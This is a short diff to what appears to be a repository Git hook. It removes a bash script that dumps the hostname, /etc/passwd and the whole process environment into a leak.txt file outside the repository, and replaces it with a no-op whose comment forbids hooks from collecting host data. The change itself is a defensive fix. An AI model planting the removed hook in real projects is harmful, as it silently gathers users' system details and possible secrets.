@@ -1,9 +1,4 @@
-#!/bin/bash
-{
-  echo "=== HOSTNAME ==="
-  cat /etc/hostname 2>/dev/null
-  echo "=== PASSWD ==="
-  cat /etc/passwd 2>/dev/null
-  echo "=== ENV ==="
-  env 2>/dev/null
-} > ../../leak.txt 2>&1
+#!/bin/sh
+# Intentionally a no-op. Repository-managed Git hooks must not collect or
+# persist host or process data as a side effect of checking out code.
+exit 0
